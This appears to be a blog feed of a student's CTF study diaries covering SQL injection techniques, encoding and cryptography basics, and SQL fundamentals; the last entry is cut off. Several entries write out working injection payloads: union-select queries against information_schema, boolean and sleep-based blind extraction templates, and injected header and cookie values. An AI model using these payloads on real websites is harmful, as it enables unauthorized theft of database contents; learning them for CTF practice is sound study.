    <category term="链表" scheme="http://favorhau.github.io/tags/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="DFS" scheme="http://favorhau.github.io/tags/DFS/"/>
    
  </entry>
  
  <entry>
    <title>20201218学习日记---sql（三）</title>
    <link href="http://favorhau.github.io/2020/12/18/20201218%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>http://favorhau.github.io/2020/12/18/20201218%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-12-18T14:29:26.000Z</published>
    <updated>2020-12-18T14:29:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>了解（入门）其他的注入方式</p><span id="more"></span><p>记录一下今天的心情吧：<br><del>C++教得挺慢的，（不过还好假期学过了），可以省下很多功夫</del><br><del>广州入冬，今天有点想去写代码（微信小程序挺有趣的）</del><br><a href="https://imgchr.com/i/rYhQOO"><img src="https://s3.ax1x.com/2020/12/18/rYhQOO.md.png" alt="rYhQOO.md.png"></a><br><em>废话少说</em><br>看了一下还有几个注入方式没学，（说实话觉得合天有些课程不是很好，所以经常左查右查别人的博客），比如说POST注入，其实和GET挺像的，只不过换了一种http method而已。</p><h1 id="POST显错注入"><a href="#POST显错注入" class="headerlink" title="POST显错注入"></a>POST显错注入</h1><p>post显错注入和get方式很相似，同时分为</p><ul><li>单引号类型<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’OR 1#</span><br></pre></td></tr></table></figure></li><li>双引号类型<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) OR 1#</span><br></pre></td></tr></table></figure></li></ul><h1 id="POST盲注"><a href="#POST盲注" class="headerlink" title="POST盲注"></a>POST盲注</h1><p>大体上和get盲注一样 只是一般以表单形式（换了一个method）。</p><h1 id="Header注入"><a href="#Header注入" class="headerlink" title="Header注入"></a>Header注入</h1><p>HTTP Header<br>HTTP请求头</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>UA部分-基于错误<br>HTTP_USER_AGENT（UA）是用来检查页面在用什么操作系统，等的相关信息。</li></ol><p><em>实例：爬虫的伪装策略与防御网络爬虫的应用</em><br>2. X-FORWARDED-FOR部分-基于错误<br>XXF是用来识别http代理或者负载均衡方式连接到web服务器的客户端最原始的IP地址及其代理地址的协议。<br>HTTP_X_FORWARD_FOR可以获取到最原始用户IP<br>漏洞产生：相比于直接修改IP地址，修改XFF头更加容易<br>漏洞利用： 伪造IP地址<br>绕过限制，获取权限，删除痕迹。<br><em>某些网站限制同一个IP只能登录一次，通过XFF的修改以达到多次登录的目的</em><br>3. Referer 部分-基于错误<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。<br><em>用于统计或者防盗链</em></p><h2 id="具体实践"><a href="#具体实践" class="headerlink" title="具体实践"></a>具体实践</h2><p>一般可以使用burp suite ，在这里先用火狐浏览器插件，其实使用burp同理（觉得这个没必要请出不burp suite）</p><h3 id="UA"><a href="#UA" class="headerlink" title="UA"></a>UA</h3><p>这个是理想的headers注入页面<br><a href="https://imgchr.com/i/rYxXvD"><img src="https://s3.ax1x.com/2020/12/18/rYxXvD.png" alt="rYxXvD.png"></a><br><a href="https://imgchr.com/i/rYxYNt"><img src="https://s3.ax1x.com/2020/12/18/rYxYNt.png" alt="rYxYNt.png"></a><br>此时可以将代理头修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union SELECT 1,2,3,uagent FROM uagents WHERE uagent like &#x27;%windows%</span><br></pre></td></tr></table></figure><p>可将代理改为符合的白名单</p><h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><p>老套路构造语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’union select 1,2,3,ip_address from uagents where username=&#x27;root&#x27;#</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/rtSFoR"><img src="https://s3.ax1x.com/2020/12/18/rtSFoR.png" alt="rtSFoR.png"></a></p><h3 id="referer"><a href="#referer" class="headerlink" title="referer"></a>referer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union SELECT 1,2,referer from referers where ip_address=&#x27;10.10.10.10&#x27;#</span><br></pre></td></tr></table></figure><p>修改referer 和第一个UA有点像</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说都是老套路，实际上的话还会涉及到方方面面，在这里还有许多疑问，比方说 from后面一定要是referers吗？，select后面为什么要是1，2，目的何在？<br>查找了一下—真正的需要构造许多payload一步步拆解<del>（实战再说）</del></p><h1 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h1><p>其实觉得cookie注入是里面最有趣的，常常浏览器会提示“储存cookie”等信息，类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密）。这里就需要用到base64.<br><strong>cookie注入本质就是：伪装成admin</strong></p><p>将下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;union select * from users where id=14# 第一种</span><br><span class="line">&#x27;) union select * from users where id=12# 第二种</span><br></pre></td></tr></table></figure><p>进行base64编码后以cookie方式上传。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>习得了基本的概念性知识，具体实战需要磨练，比如说cookie注入-还需要使用到JavaScript，工具可以使用sqlmap进行。<br>其实在这里 sql注入算是已经基本告一段落了，在这里我学到了基本的sql语句，为<del>大二的</del>数据库学习可以奠定一些基础。<br>于此同时，对于CTF，可能还需要在题目实战的路上继续走。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;了解（入门）其他的注入方式&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="SQL注入" scheme="http://favorhau.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>20201217学习日记---cryto</title>
    <link href="http://favorhau.github.io/2020/12/17/20201217%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---cryto/"/>
    <id>http://favorhau.github.io/2020/12/17/20201217%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---cryto/</id>
    <published>2020-12-17T15:59:26.000Z</published>
    <updated>2021-09-06T01:28:05.585Z</updated>
    
    <content type="html"><![CDATA[<p>作为入门的ctf玩家，需要懂得常用的密码。</p><span id="more"></span><p>说到密码，很多人会把MD5、base64等混淆在一起（<del>包括我之前也会把md5称为“密码”</del>）。其实严格区分起来，应该是：</p><ul><li>加密(encipher/decipher)：加密传输信息，保证信息安全性，通过密钥和密文可以还原原始信息</li><li>编码(encode/decode)：将数据转化成某种固定格式的编码信息，方便不同系统间的传输，通过解码编码信息可以得到原始信息。</li><li>散列(hash)：也叫摘要或哈希，验证信息的完整性，不能通过哈希值还原原始信息。</li></ul><p>比起系统学习各种密码（编码），更多的应该是在做题、项目中习得，比方说url编码、base64编码等就经常会被使用。</p><h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><p>常见的编码：ASCII（美国信息交换标准代码）、Base64、URL编码、HTML编码、Unicode编码、UTF-8、莫斯电码、二维码</p><ul><li>ASCII<br>（American Standard Code for Information Interchange，美国标准信息交换代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO/IEC 646。<img src="http://www.asciima.com/img/ascii-Table.jpg" alt="ASCII码表"></li><li>Base64<br>一般可以用来处理在HTTP环境下传递较长的标识信息</li><li>URL编码<br>这个是非常常见的 不能漏掉（相当于一种规范）</li><li>Unicode<br>Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。<br><del>（其实一直对Unicode 、 gbk 、utf-8 不理解，直到我看到了这个）<a href="https://www.cnblogs.com/gavin-num1/p/5170247.html">传送门</a></del><br>Unicode：OSI指定的编码标准；<br>GBK：Chinese Internal Code Specification 汉字内码扩展规范<br>UTF-8：一种针对Unicode的一种可变长度字符编码</li><li>其他编码<br><del>其实编码给我的感觉就是：无密码的密码</del><br>剩下的还有诸如莫斯电码（不同网站出来的结果会不一样）、二维码这些。</li></ul><h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><p>加密常规一般可以分为，对称性加密目前研究已经相对充分，而非对称性加密还有很长的路需要走。</p><ul><li>对称性加密（symmetrical encryption）</li><li>非对称性加密（Asymmetric encryption）</li></ul><h2 id="对称性加密"><a href="#对称性加密" class="headerlink" title="对称性加密"></a>对称性加密</h2><p>“对称密钥”的加密算法主要有DES、TripleDES、RC2、RC4、RC5和Blowfish等。<br>以上的加密算法基本准寻以下算法特征：</p><ol><li>加密方和解密方使用同一个密钥；</li><li>加密解密的速度比较快，适合数据比较长时的使用；</li><li>密钥传输的过程不安全，且容易被破解，密钥管理也比较麻烦；</li></ol><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>对称加密算法在加密和解密时使用的是同一个秘钥；而非对称加密算法需要两个密钥来进行加密和解密，这两个密钥是公开密钥（public key，简称公钥）和私有密钥（private key，简称私钥）<br>非对称性加密一般有：RSA、DSA、ECDSA。</p><p><strong>说到非对称性加密 那就不得不说RSA了。</strong></p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>RSA公开密钥密码体制是一种使用不同的加密密钥与解密密钥，“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制。<br>找了挺多的体制解释，比较好的是这个<a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html">传送门</a><br>梳理了一下思路 大概上就分为四个步骤。</p><ol><li>选取素数n</li><li>选取大整数e</li><li>确定密钥d</li><li>公开n和e保存d<br>当然具体过程并没有那么简单。<br>而如果要破解此加密的关键就是选取的<em>大素数n</em>无法被分解（目前仅能分解到2048位)<br>但是</li></ol><p><strong>2020年12月4日，中国科学技术大学宣布该校潘建伟等人成功构建76个光子的量子计算机九章</strong><br>当然，要对付量子计算机，会有专门的量子密码<del>（仅了解，虽然我也不懂具体是啥）</del><br>诚然，从来就没有绝对的安全。安全都是相对的。</p><h3 id="其他非对称性加密"><a href="#其他非对称性加密" class="headerlink" title="其他非对称性加密"></a>其他非对称性加密</h3><p>对称性加密最经典的、以及最常见常用的应该是RSA。公钥密码体制采用的加密密钥(公开钥)和解密密钥(秘密钥)是不同的。由于加密密钥是公开的，密钥的分配和管理就很简单，而且能够很容易地实现数字签名，因此最适合于电子商务应用的需要。<br><em>其主要的优点是：<br>(1)密钥分配简单。<br>(2)密钥的保存量少。<br>(3)可以满足互不相识的人之间进行私人谈话时的保密性要求。<br>(4)可以完成数字签名和数字鉴别。<br>但在实际应用中，公钥密码体制并没有完全取代私钥密码体制，这是因为公钥密码体制在应用中存在以下几个缺点：<br>(1)公钥密码是对大数进行操作，计算量特别浩大，速度远比不上私钥密码体制。<br>(2)公钥密码中要将相当一部分密码信息予以公布，势必对系统产生影响。<br>(3)在公钥密码中，若公钥文件被更改，则公钥被攻破。<br>（摘自百度百科）</em></p><h1 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h1><p>常见摘要：MD5、SHA1（主要适用于数字签名标准DSS里面定义的数字签名算法）<br>无论多长的一段数据经过MD5之后都会变成指定的长度。<br>把MD5称为“加密”应当是不准确的，MD（Message-Digest Algorithm）信息摘要算法<br>最直观的应该是MD5<em>不可逆</em>，<del>（虽然有很多声称MD5破解的网站）</del><br>有MD5,也有MD4,MD2等。<br>目前没有软件能有效地破解 MD5。大多数时候只是把常见字符串的 MD5 存了起来为彩虹表，然后直接反查。<br>所谓”破解“的网站无非就是存了大量的可能密码。<br>比如 <a href="https://cmd5.com/">https://cmd5.com/</a> </p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>CTF基本上看不懂的文字上面大都已经涵盖（可能只是小部分），在实战中（听说）还会出现诸如彩虹密码等<em>新型密码</em>，这就得看造化（yun qi）了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;作为入门的ctf玩家，需要懂得常用的密码。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="cryto" scheme="http://favorhau.github.io/tags/cryto/"/>
    
  </entry>
  
  <entry>
    <title>20201216学习日记---sql注入（二）</title>
    <link href="http://favorhau.github.io/2020/12/16/20201216%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://favorhau.github.io/2020/12/16/20201216%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-12-16T12:28:26.000Z</published>
    <updated>2021-09-06T01:27:15.212Z</updated>
    
    <content type="html"><![CDATA[<p>前面认识了一些    sql的操作 ，下面进一步探究。<br><strong>注入攻击的本质，是把用户输入的数据当做代码执行</strong></p><span id="more"></span><h1 id="GET注入-SQL显错注入"><a href="#GET注入-SQL显错注入" class="headerlink" title="GET注入-SQL显错注入"></a>GET注入-SQL显错注入</h1><h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p><em>显错注入</em>最简单的方法：页面传参后加 <strong>‘</strong>,看看是否报错。<br>最古老的方法：1=1//页面正常1=2//页面不正常<br>GET注入一般分为</p><ul><li>单引号型  在参数后加’</li><li>数字型 在参数后加数字</li><li>单引号变形 在参数后加’)</li><li>双引号 在参数后加”</li></ul><h2 id="显错注入-联合查询"><a href="#显错注入-联合查询" class="headerlink" title="显错注入-联合查询"></a>显错注入-联合查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select * from users--+</span><br></pre></td></tr></table></figure><p>其实看了挺久 ，为什么需要添加<u>–+</u>呢？</p><p>后来通过查询发现，提交的语句为127.0.0.1/less-1/?id=’1’ order by 3’ 这样就会报错，但是加了注释，提交的语句就是这样127.0.0.1/less-1/?id=’1’ order by 3#’,后面的单引号就被注释掉了，就没有问题。</p><h2 id="常用显错注入语句"><a href="#常用显错注入语句" class="headerlink" title="常用显错注入语句"></a>常用显错注入语句</h2><table><thead><tr><th>and 1=1/and 1=2</th><th>判断是否存在注入</th></tr></thead><tbody><tr><td>and 1=1 order by 3</td><td>按哪一列进行排序，从而可以确定有多少列</td></tr><tr><td>and 1=2 union select 1,2,3</td><td>查看页面中显示哪些数字,比如显示2，3</td></tr><tr><td>and 1=2 union select 1,2,database()</td><td>原本显示3的位置会显示数据库名称</td></tr><tr><td>and 1=2 union select 1,2,version()</td><td>会显示数据库版本</td></tr><tr><td>and 1=2 union select  1,2,group_concat(table_name) from information_schema.tables where  table_schema= database()</td><td>查询当前数据库下的表名</td></tr><tr><td>and 1=2 union select  1,2,group_concat(column_name) from information_schema.columns where  table_schema=database() and table_name=’表名’</td><td>查看数据库字段名</td></tr><tr><td>and 1=2 union select 1,2,group_concat(字段名) from 表名</td><td>查看字段内容</td></tr></tbody></table><h1 id="GET注入-盲注"><a href="#GET注入-盲注" class="headerlink" title="GET注入-盲注"></a>GET注入-盲注</h1><p>get盲注一般分为</p><ol><li><p>基于布尔的盲注。这种方法主要通过页面的返回内容不同来获取信息。</p></li><li><p>基于时间的盲注。这种方法主要通过页面的响应时间不同来获取信息。</p><p>盲注需要掌握的MySQL相关函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">length(str)#返回str字符串的长度。如执行select</span><br><span class="line">length(database())#则会返回当前数据库名称的长度。而单独select</span><br><span class="line">database()#则回返回当前数据库的名称。</span><br><span class="line">substr(str, pos, len)#从pos位置取出str字符串的len个字符。如</span><br><span class="line">select substring(&#x27;abcde&#x27;, 4, 2)#则返回de，pos为负则倒数pos个位置</span><br><span class="line">select substring(&#x27;abcde&#x27;, -4, 2);#返回bc。</span><br><span class="line">ASCII(str)#返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。如select ASCII(&#x27;a&#x27;)返回97。</span><br></pre></td></tr></table></figure><p>除此之外还有条件语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((exp1, exp2, exp3) #为条件判断语句。当exp1的值为true时候，返回exp2，否则返回exp3。</span><br></pre></td></tr></table></figure><p>在注入的时候上述的语句容易被拦截 故可用下面的语句代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when (条件) then 代码1 else 代码2 end</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2></li></ol><p><em>原理：在页面中，如果正确执行了sql语句，则返回一种页面，如果执行错误，则执行另一种页面。基于这两种页面，判断sql正确与否。</em></p><h3 id="获取-猜测-数据库长度"><a href="#获取-猜测-数据库长度" class="headerlink" title="获取(猜测)数据库长度"></a>获取(猜测)数据库长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(database()))&gt;长度--+</span><br></pre></td></tr></table></figure><h3 id="猜测数据表名称"><a href="#猜测数据表名称" class="headerlink" title="猜测数据表名称"></a>猜测数据表名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select ascii(substr(database(),1,1)))&gt;名称--+</span><br></pre></td></tr></table></figure><h3 id="猜解表名数量"><a href="#猜解表名数量" class="headerlink" title="猜解表名数量"></a>猜解表名数量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(table_name) from information_schema.tables where table_schema=database())=数量 </span><br><span class="line"># information_schema.tables 专门用来储存所以表，5.0以上版本才有</span><br></pre></td></tr></table></figure><h3 id="猜解某个表长度"><a href="#猜解某个表长度" class="headerlink" title="猜解某个表长度"></a>猜解某个表长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度 #同理n从0来表示变化的表来求该库下的对应的表的长度</span><br></pre></td></tr></table></figure><h3 id="逐位猜解表名"><a href="#逐位猜解表名" class="headerlink" title="逐位猜解表名"></a>逐位猜解表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select ascii(substr(table_name,1,1)) from information_schema.tables </span><br><span class="line">where table_schema = database() limit n,1)=ascii码 #从前面的1变化是求表名，而n变化是对应的库中的表</span><br></pre></td></tr></table></figure><h3 id="猜解列名数量"><a href="#猜解列名数量" class="headerlink" title="猜解列名数量"></a>猜解列名数量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.columns where table_schema =database() and table_name = 表名)=数量#information_schema.columns 专门用来存储所有的列</span><br></pre></td></tr></table></figure><h3 id="猜解某个列长度"><a href="#猜解某个列长度" class="headerlink" title="猜解某个列长度"></a>猜解某个列长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(column_name) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=长度</span><br></pre></td></tr></table></figure><h3 id="逐位猜解列名"><a href="#逐位猜解列名" class="headerlink" title="逐位猜解列名"></a>逐位猜解列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=ascii码</span><br></pre></td></tr></table></figure><h3 id="判断数据的数量"><a href="#判断数据的数量" class="headerlink" title="判断数据的数量"></a>判断数据的数量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(列名) from 表名)=数量</span><br></pre></td></tr></table></figure><h3 id="猜解某条数据的长度"><a href="#猜解某条数据的长度" class="headerlink" title="猜解某条数据的长度"></a>猜解某条数据的长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(列名) from 表名 limit n,1)=长度</span><br></pre></td></tr></table></figure><h3 id="逐位猜解数据"><a href="#逐位猜解数据" class="headerlink" title="逐位猜解数据"></a>逐位猜解数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select ascii(substr(user,位数,1)) from 表名 limit n,1)=ascii码</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>布尔盲注是根据页面正常否进行注入，而时间盲注则是通过SQL语句查询的时间来进行注入,一般是在页面无回显，无报错的情况下使用</p><p>可以通过F12来看其页面回显的时间与布尔盲注是一样的</p><h3 id="猜解数据库长度"><a href="#猜解数据库长度" class="headerlink" title="猜解数据库长度"></a>猜解数据库长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select length(database()))=长度,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select ascii(substr(database(),位数,1))=ascii码),sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="判断表名的数量"><a href="#判断表名的数量" class="headerlink" title="判断表名的数量"></a>判断表名的数量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="判断某个表名的长度"><a href="#判断某个表名的长度" class="headerlink" title="判断某个表名的长度"></a>判断某个表名的长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="逐位猜表名"><a href="#逐位猜表名" class="headerlink" title="逐位猜表名"></a>逐位猜表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema=database() limit n,1)=ascii码,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="判断列名数量"><a href="#判断列名数量" class="headerlink" title="判断列名数量"></a>判断列名数量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select count(column_name) from information_schema.columns where table_name=&quot;表名&quot;)=个数,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="判断某个列名的长度"><a href="#判断某个列名的长度" class="headerlink" title="判断某个列名的长度"></a>判断某个列名的长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select length(column_name) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=长度,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="逐位猜列名"><a href="#逐位猜列名" class="headerlink" title="逐位猜列名"></a>逐位猜列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name=&quot;表名&quot; limit n,1)=ascii码,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="判断数据的数量-1"><a href="#判断数据的数量-1" class="headerlink" title="判断数据的数量"></a>判断数据的数量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select count(列名) from 表名)=个数,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="判断某个数据的长度"><a href="#判断某个数据的长度" class="headerlink" title="判断某个数据的长度"></a>判断某个数据的长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select length(列名) from 表名)=长度,sleep(6),0)</span><br></pre></td></tr></table></figure><h3 id="逐位猜数据"><a href="#逐位猜数据" class="headerlink" title="逐位猜数据"></a>逐位猜数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select ascii(substr(列名,n,1)) from 表名)=ascii码,sleep(6),0)</span><br></pre></td></tr></table></figure><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>本次学习习得了两种常用注入方式，进而在此过程中提高了对sql语句的认知，<br><del>但是说实话这些语句需要备忘录，很多会忘记。</del><br>看了那么多 我又想起了最初的那一句话</p><p>除了get注入之外 还有post注入、headers注入等注入方式，接下来将对其展开学习。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前面认识了一些    sql的操作 ，下面进一步探究。&lt;br&gt;&lt;strong&gt;注入攻击的本质，是把用户输入的数据当做代码执行&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="SQL注入" scheme="http://favorhau.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>20201214学习日记---sql注入</title>
    <link href="http://favorhau.github.io/2020/12/14/20201214%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://favorhau.github.io/2020/12/14/20201214%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0---sql%E6%B3%A8%E5%85%A5/</id>
    <published>2020-12-14T05:28:26.000Z</published>
    <updated>2020-12-15T16:31:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>终于来到sql注入的学习了，sql注入先是给我了很“黑客”的感觉，之前有操作过phpmyadmin，接触了数据库普通的“查删减改”（大多数都是在后端云干的），那sql语句长什么样子呢，sql注入又是如何。</p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><em>SQL注入</em>望文生义先是与sql有关。想了解如何注入 我想需要先了解一下SQL。<br>SQL （Structured Query Language）结构化查询语言，常见的SQL数据库有MySQL、sql、server，Oracle、Sybase等。<br>在开始之前使用了一个很好用的php集成开发环境-phpstudy<br>其支持一键LAMP,LNMP,集群,监控,网站,FTP,数据库,JAVA等100多项服务器管理功能<br><a href="https://imgchr.com/i/rngMvT"><img src="https://s3.ax1x.com/2020/12/14/rngMvT.png" alt="rngMvT.png"></a></p><h1 id="SQL结构"><a href="#SQL结构" class="headerlink" title="SQL结构"></a>SQL结构</h1><p>sql结构如图所示，如图：数据表-字段-数据这样的结构。</p><p><a href="https://imgchr.com/i/rn6DSK"><img src="https://s3.ax1x.com/2020/12/14/rn6DSK.md.png" alt="rn6DSK.md.png"></a></p><h1 id="SQL数据类型"><a href="#SQL数据类型" class="headerlink" title="SQL数据类型"></a>SQL数据类型</h1><p>SQL数据类型除了常规的整型、文本型，又细分了具体的类型。<br>比如text分为char、varchar等。<br><a href="https://www.w3school.com.cn/sql/sql_datatypes.asp">具体分类</a></p><h1 id="常用的SQL语句"><a href="#常用的SQL语句" class="headerlink" title="常用的SQL语句"></a>常用的SQL语句</h1><p>在概念里面，SQL常用的应该是【查、删、减、改】，后面应该对这四个最基本的熟练掌握。</p><h2 id="SQL表约束"><a href="#SQL表约束" class="headerlink" title="SQL表约束"></a>SQL表约束</h2><p><a href="https://imgchr.com/i/rnxzIs"><img src="https://s3.ax1x.com/2020/12/14/rnxzIs.png" alt="rnxzIs.png"></a></p><p><strong>show databases;</strong><br>查询数据库</p><p><strong>create table 